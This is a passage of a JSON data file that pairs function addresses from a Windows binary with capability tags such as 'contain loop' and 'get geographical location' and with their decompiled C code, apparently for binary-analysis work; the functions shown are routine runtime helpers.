        "decompiled_code": "\nvoid __cdecl fcn.00401510(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t in_ECX;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004014f0();\n    uVar2 = fcn.004017a0();\n    if (uVar1 < uVar2) {\n        uVar3 = fcn.00401990(*(in_ECX + 0x10), 1, arg_8h);\n        *(in_ECX + 0x10) = uVar3;\n    }\n    else {\n        puVar4 = fcn.004017e0(&var_10h);\n        var_8h = *puVar4;\n        var_4h = puVar4[1];\n        fcn.00401810(&var_18h, var_8h, var_4h, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "00425cf0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00425cf0(void)\n\n{\n    *0x4391b4 = (*_sym.imp.KERNEL32.DLL_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402230": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402230(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    cVar1 = fcn.00401200();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.004011e0(arg_8h),  cVar1 == '\\0')) {\n        fcn.004039a3();\n    }\n    return (*(in_ECX + 4) - *(arg_8h + 4)) / 0x1c;\n}\n",
        "token_count": 131
    },
    "00407659": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407659(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406580(0x435220, 0xc);\n    fcn.0040a2aa(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x8f96b4;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x8f96b0;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040769d;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404e5b(arg_8h_00);\ncode_r0x0040769d:\n        fcn.00404e5b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004076c0();\n    fcn.004065c5();\n    return;\n}\n",
        "token_count": 401
    },
    "004077be": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004077be(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406580(0x435260, 0xc);\n    fcn.0040a2aa(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x8f96b4;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x8f96b0;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00407802;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404e5b(arg_8h_00);\ncode_r0x00407802:\n        fcn.00404e5b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00407825();\n    fcn.004065c5();\n    return;\n}\n",
        "token_count": 398
    },
    "0041fb48": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fb48(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    (*_sym.imp.KERNEL32.DLL_GetLocaleInfoW)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 71
    }
}